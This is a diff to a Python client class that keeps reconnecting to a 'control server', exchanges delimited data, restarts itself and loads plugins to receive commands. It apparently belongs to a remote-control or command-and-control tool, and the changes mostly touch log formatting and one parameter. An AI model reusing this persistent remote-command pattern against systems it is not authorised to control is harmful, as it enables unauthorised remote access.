@@ -40,10 +40,10 @@ class Client(PluginRunner):
             self.sock = socket.socket()
             try:
                 self.sock.connect((self.host, self.port))
-                print('Connected to server...')
+                print('< Connected to server. >')
                 break
             except socket.error as the_error_message:
-                print('Waiting for control server {}:{} {}'.format(self.host, self.port, the_error_message))
+                print('< Waiting for control server {}:{} {} >'.format(self.host, self.port, the_error_message))
                 sleep(5)
 
         return self.sock
@@ -80,9 +80,9 @@ class Client(PluginRunner):
         :return:
         """
 
-        self.send_data('~!_TERM_$~', terminate=False)
+        self.send_data('~!_TERM_$~', chunks=True)
 
-    def server_print(self, some_data, echo=True, encode=True, terminate=True):
+    def server_print(self, some_data, echo=True, encode=True, chunks=False):
         """
         A shortcut method to facilitate sending data to the server without worrying about
         whether or not there is a newline character at the end.
@@ -90,34 +90,34 @@ class Client(PluginRunner):
         :param some_data:
         :param echo:
         :param encode:
-        :param terminate:
+        :param chunks:
         :return:
         """
 
         some_data = some_data + '\n' if some_data[-1] != '\n' else some_data
-        self.send_data(some_data, echo=echo, encode=encode, terminate=terminate)
+        self.send_data(some_data, echo=echo, encode=encode, chunks=chunks)
         return
 
-    def send_data(self, some_data, echo=True, encode=True, terminate=True):
+    def send_data(self, some_data, echo=True, encode=True, chunks=False):
         """
         Send data to the server with the termination string appended.
 
         :param some_data:
         :param echo:
         :param encode:
-        :param terminate:
+        :param chunks:
         :return:
         """
 
         if echo:
-            print('Sending Data:', some_data)
+            print('< Sending Data:', some_data, '>')
 
         if encode:
             self.sock.send(str.encode(str(some_data)))
         else:
             self.sock.send(some_data)
 
-        if terminate:
+        if not chunks:
             self.sock.send(str.encode('~!_TERM_$~'))
 
         return self
@@ -134,7 +134,7 @@ class Client(PluginRunner):
         # Try to receive data.
         accepting = True
         total_data = ''
-        print('Receiving data...')
+        print('< Receiving data. >')
         while accepting:
             try:
                 data = self.sock.recv(self.recv_size)
@@ -146,7 +146,7 @@ class Client(PluginRunner):
 
             # Continue looping if there is no data.
             if len(data) < 1:
-                print('Zero data received...', end='\r')
+                print('< Zero data received. >', end='\r')
                 self.sock.close()
                 self.sock = self._connect_to_server()
                 continue
@@ -191,6 +191,7 @@ class Client(PluginRunner):
         :return:
         """
 
+        print('< Rebooting self. >')
         try:
             self.sock.close()
         except socket.error:
@@ -210,7 +211,7 @@ class Client(PluginRunner):
             p.communicate()
         except PermissionError:
             from os import execv
-            print('Using execv...')
+            print('< Using execv. >')
             rc.pop(0)
             rc.insert(0, realpath(__file__))
             rc.insert(0, '')
@@ -225,12 +226,11 @@ class Client(PluginRunner):
         :return:
         """
 
-        print('Disconnecting...')
+        print('< Disconnecting. >')
         # Handle a disconnect command.
         self.send_data('confirmed')
         self.sock.close()
-        print('Sleeping for 5 seconds...')
-        sleep(5)
+        sleep(1)
         self._connect_to_server()
         return self
 
@@ -242,7 +242,7 @@ class Client(PluginRunner):
         """
 
         plugin_list = self.get_client_plugins()
-        print('Loaded {} plugins...'.format(len(plugin_list)))
+        print('< Loaded {} plugins. >'.format(len(plugin_list)))
 
         # If we have a socket, then proceed to receive commands.
         if self.sock:
